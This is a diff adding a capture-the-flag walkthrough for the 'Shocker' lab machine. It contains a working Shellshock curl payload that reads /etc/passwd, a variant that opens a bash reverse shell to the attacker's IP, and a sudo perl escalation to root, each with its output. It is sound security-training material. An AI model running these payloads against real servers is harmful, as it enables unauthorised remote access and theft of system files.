@@ -1,5 +1,5 @@
 ## Default Information
-IP address : 10.10.10.56
+IP address : 10.10.10.56\
 OS : Linux
 
 ## Enumeration
@@ -114,4 +114,102 @@ We will just keep this ```/cgi-bin/user.sh``` file in mind for now and carry on 
 + The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
 + The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
 + Apache/2.4.18 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+```
+With the information that we are using an outdated ```Apache``` webserver and the presence of a ```cgi-bin``` and a little hint from the box's name, we suspect that the box is vulnerable to ```shellshock``` vulnerability. So, now we will test a POC for shellshock.
+```
+┌──(kali㉿kali)-[~]
+└─$ curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'" http://10.10.10.56/cgi-bin/user.sh
+
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
+systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
+systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
+systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
+syslog:x:104:108::/home/syslog:/bin/false
+_apt:x:105:65534::/nonexistent:/bin/false
+lxd:x:106:65534::/var/lib/lxd/:/bin/false
+messagebus:x:107:111::/var/run/dbus:/bin/false
+uuidd:x:108:112::/run/uuidd:/bin/false
+```
+Now, we have successfully exfiltrated the ```/etc/passwd``` file which proved that our POC is successful. So, next we will create a reverse shell to connect to the attacker machine. To do that, we will create a listener on our attacking machine and modify the payload as follows:
+```
+curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'bash -i >& /dev/tcp/10.10.16.250/3000 0>&1'" http://10.10.10.56/cgi-bin/user.sh
+```
+Afterwards, we would have successfully created a reverse shell and all that is left for us to do is to stabilize the shell
+```
+┌──(kali㉿kali)-[~]
+└─$ nc -nlvp 3000       
+listening on [any] 3000 ...
+connect to [10.10.16.250] from (UNKNOWN) [10.10.10.56] 56940
+bash: no job control in this shell
+shelly@Shocker:/usr/lib/cgi-bin$ python3 -c 'import pty; pty.spawn("/bin/bash")'
+<-bin$ python3 -c 'import pty; pty.spawn("/bin/bash)'                        
+shelly@Shocker:/usr/lib/cgi-bin$ export TERM=xterm
+export TERM=xterm
+shelly@Shocker:/usr/lib/cgi-bin$ stty cols 132 rows 34
+stty cols 132 rows 34
+shelly@Shocker:/usr/lib/cgi-bin$ 
+```
+
+## Obtaining user flag
+```
+shelly@Shocker:/$ ls
+ls
+bin   dev  home        initrd.img.old  lib64       media  opt   root  sbin  srv  tmp  var      vmlinuz.old
+boot  etc  initrd.img  lib             lost+found  mnt    proc  run   snap  sys  usr  vmlinuz
+shelly@Shocker:/$ cd home
+cd home
+shelly@Shocker:/home$ ls
+ls
+shelly
+shelly@Shocker:/home$ cd shelly
+cd shelly
+shelly@Shocker:/home/shelly$ ls
+ls
+user.txt
+shelly@Shocker:/home/shelly$ cat user.txt
+cat user.txt
+<Redacted user flag>
+```
+
+## Obtaining system flag
+However, we are not done yet! We have not obtainted our system flag yet. To do so, let's first find the programs with root privileges using ```sudo -l```. From the output, we realized that /usr/bin/perl is able to execute root privileges without any password.
+```
+shelly@Shocker:/home/shelly$ sudo -l
+sudo -l
+Matching Defaults entries for shelly on Shocker:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User shelly may run the following commands on Shocker:
+    (root) NOPASSWD: /usr/bin/perl
+```
+Now all we need to do is to use ```perl``` to execute a ```/bin/bash``` command and obtain the root flag.
+```
+shelly@Shocker:/home/shelly$ sudo /usr/bin/perl -e 'exec "/bin/bash";'
+sudo /usr/bin/perl -e 'exec "/bin/bash";'
+root@Shocker:/home/shelly# cd ..
+cd ..
+root@Shocker:/home# cd ..
+cd ..
+root@Shocker:~# cat root.txt
+cat root.txt
+<Redacted system flag>
+root@Shocker:~# 
 ```
